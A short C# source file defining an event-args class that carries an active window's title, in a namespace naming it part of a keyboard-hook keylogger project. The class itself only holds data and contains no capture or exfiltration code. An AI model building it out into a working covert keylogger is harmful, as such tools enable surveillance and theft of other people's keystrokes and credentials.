using System;

namespace KeyBoardHook.KeyLogger.Entity
{
    internal class ActiveWindowChangedEventArgs : EventArgs
    {
        public ActiveWindowChangedEventArgs(string title)
        {
            Title = title;
        }

        public string Title { get; }
    }
}